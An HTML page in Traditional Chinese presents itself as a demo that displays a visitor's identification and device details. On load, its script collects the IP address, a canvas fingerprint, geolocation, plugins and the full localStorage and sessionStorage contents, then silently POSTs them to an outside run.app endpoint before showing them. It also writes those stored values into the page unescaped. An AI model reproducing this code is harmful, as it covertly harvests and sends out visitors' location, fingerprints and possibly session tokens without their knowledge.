<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>用戶識別與設備分辨示例</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            color: #333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        @media (max-width: 600px) {
            table, thead, tbody, th, td, tr {
                display: block;
            }
            th {
                display: none;
            }
            td {
                border: none;
                position: relative;
                padding-left: 50%;
            }
            td:before {
                content: attr(data-label);
                position: absolute;
                left: 0;
                width: 45%;
                padding-left: 15px;
                font-weight: bold;
                white-space: nowrap;
            }
        }
    </style>
</head>
<body>
    <h1>用戶識別與設備分辨示例</h1>
    <div id="user-info"></div>
    <script>
        function setCookie(name, value, days) {
            const d = new Date();
            d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
            const expires = "expires=" + d.toUTCString();
            document.cookie = name + "=" + value + ";" + expires + ";path=/";
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const ca = document.cookie.split(';');
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
            }
            return null;
        }

        function generateUserId() {
            let userId = getCookie('userId');
            if (!userId) {
                userId = 'user_' + Math.random().toString(36).substr(2, 9);
                setCookie('userId', userId, 365);
            }
            return userId;
        }

        async function getIpAddress() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        function getBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
    
            // 设置 Canvas 尺寸
            canvas.width = 200;
            canvas.height = 50;
    
            // 绘制背景和文本
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('Browser fingerprint', 10, 25);
    
            // 返回 Canvas 的 base64 编码数据
            return canvas.toDataURL().split(',')[1];
        }

        function getHttpHeaders() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
            };
        }

        function getDeviceInfo() {
            return {
                platform: navigator.platform,
                vendor: navigator.vendor,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'Unknown',
            };
        }

        async function getGeolocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                            });
                        },
                        (error) => {
                            reject(error);
                        }
                    );
                } else {
                    resolve({
                        latitude: 'Not available',
                        longitude: 'Not available',
                    });
                }
            });
        }

        function getTimezone() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        function getScreenResolution() {
            return {
                width: screen.width,
                height: screen.height,
            };
        }

        function getPlugins() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        }

        function getLocalStorage() {
            const storage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage[key] = localStorage.getItem(key);
            }
            return storage;
        }

        function getSessionStorage() {
            const storage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage[key] = sessionStorage.getItem(key);
            }
            return storage;
        }

        function jsonToTableRows(json, label) {
            let rows = '';
            for (const key in json) {
                if (json.hasOwnProperty(key)) {
                    rows += `
                        <tr>
                            <td data-label="${label}">${key}</td>
                            <td data-label="${key}">${json[key]}</td>
                        </tr>
                    `;
                }
            }
            return rows;
        }

        async function displayUserInfo() {
            const userId = generateUserId();
            const ipAddress = await getIpAddress();
            const browserFingerprint = getBrowserFingerprint();
            const httpHeaders = getHttpHeaders();
            const deviceInfo = getDeviceInfo();
            const geolocation = await getGeolocation();
            const timezone = getTimezone();
            const screenResolution = getScreenResolution();
            const plugins = getPlugins();
            const localStorageData = getLocalStorage();
            const sessionStorageData = getSessionStorage();

            const userInfo = {
                userId,
                ipAddress,
                browserFingerprint,
                httpHeaders,
                deviceInfo,
                geolocation,
                timezone,
                screenResolution,
                plugins,
                localStorageData,
                sessionStorageData,
            };

            await fetch('https://google-sheets-proxy-mk66ircp2a-uc.a.run.app/Angelia', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(userInfo),
            });

            const userInfoDiv = document.getElementById('user-info');
            userInfoDiv.innerHTML = `
                <table>
                    <thead>
                        <tr>
                            <th>數據類型</th>
                            <th>值</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td data-label="數據類型">Cookie 用戶 ID</td>
                            <td data-label="值">${userId}</td>
                        </tr>
                        <tr>
                            <td data-label="數據類型">IP 地址</td>
                            <td data-label="值">${ipAddress}</td>
                        </tr>
                        <tr>
                            <td data-label="數據類型">瀏覽器指紋</td>
                            <td data-label="值">${browserFingerprint}</td>
                        </tr>
                        ${jsonToTableRows(httpHeaders, 'HTTP 標頭')}
                        ${jsonToTableRows(deviceInfo, '設備信息')}
                        <tr>
                            <td data-label="數據類型">地理位置</td>
                            <td data-label="值">緯度: ${geolocation.latitude}, 經度: ${geolocation.longitude}</td>
                        </tr>
                        <tr>
                            <td data-label="數據類型">時區</td>
                            <td data-label="值">${timezone}</td>
                        </tr>
                        <tr>
                            <td data-label="數據類型">屏幕分辨率</td>
                            <td data-label="值">${screenResolution.width} x ${screenResolution.height}</td>
                        </tr>
                        <tr>
                            <td data-label="數據類型">安裝的插件</td>
                            <td data-label="值">${plugins.join(', ')}</td>
                        </tr>
                        ${jsonToTableRows(localStorageData, '本地存儲')}
                        ${jsonToTableRows(sessionStorageData, '會話存儲')}
                    </tbody>
                </table>
            `;
        }

        displayUserInfo();
    </script>
</body>
</html>
